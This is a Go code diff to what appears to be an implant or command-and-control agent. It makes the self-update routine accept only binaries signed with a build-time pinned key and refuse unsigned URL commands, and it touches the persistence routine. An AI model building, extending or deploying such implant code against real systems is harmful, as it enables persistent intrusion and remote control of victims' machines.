@@ -14,6 +14,7 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+	"strings"
 	"time"
 )
 
@@ -26,9 +27,7 @@ func addPersistence() {
 	case "darwin":
 		addPersistenceDarwin()
 	default:
-		if Debug {
-			fmt.Printf("[*] Persistence not implemented for %s\n", runtime.GOOS)
-		}
+		fmt.Printf("[!] Persistence not supported on %s\n", runtime.GOOS)
 	}
 }
 
@@ -86,9 +85,16 @@ func selfUpdate(cmdJSON string) string {
 	var params struct {
 		URL       string `json:"url"`
 		Signature string `json:"signature"`
+		// PublicKey is IGNORED: only the compile-time pinned key is trusted.
 		PublicKey string `json:"public_key"`
 	}
-	if err := json.Unmarshal([]byte(cmdJSON), &params); err != nil {
+	trimmedCmd := strings.TrimSpace(cmdJSON)
+	if err := json.Unmarshal([]byte(trimmedCmd), &params); err != nil {
+		// Legacy bare-URL commands cannot carry a signature, so they can never
+		// satisfy the pinned-key check — say so instead of a cryptic parse error.
+		if strings.HasPrefix(trimmedCmd, "http://") || strings.HasPrefix(trimmedCmd, "https://") {
+			return "self_update refused: bare URL command; send a signed JSON envelope {url, signature}"
+		}
 		return "failed to parse update command: " + err.Error()
 	}
 	if params.URL == "" {
@@ -99,14 +105,17 @@ func selfUpdate(cmdJSON string) string {
 	if err != nil {
 		return "failed to decode signature: " + err.Error()
 	}
-
-	// Prefer a pinned, compile-time trust root over any key shipped in the task.
-	verifyKeyHex := params.PublicKey
-	if updatePinnedPubKeyHex != "" {
-		verifyKeyHex = updatePinnedPubKeyHex
-	} else if Debug {
-		fmt.Printf("[!] self_update: no pinned update key configured; trusting task-supplied key\n")
+	if len(signature) != ed25519.SignatureSize {
+		return fmt.Sprintf("invalid signature length %d (want %d)", len(signature), ed25519.SignatureSize)
 	}
+
+	// Fail closed: without a compile-time pinned trust root nothing anchors
+	// this implant to our signing key, and honouring a task-supplied key would
+	// let anyone who can issue tasks push arbitrary binaries.
+	if updatePinnedPubKeyHex == "" {
+		return "self_update refused: no update signing key pinned at build time"
+	}
+	verifyKeyHex := updatePinnedPubKeyHex
 	if _, err := hex.DecodeString(verifyKeyHex); err != nil {
 		return "failed to decode public key: " + err.Error()
 	}
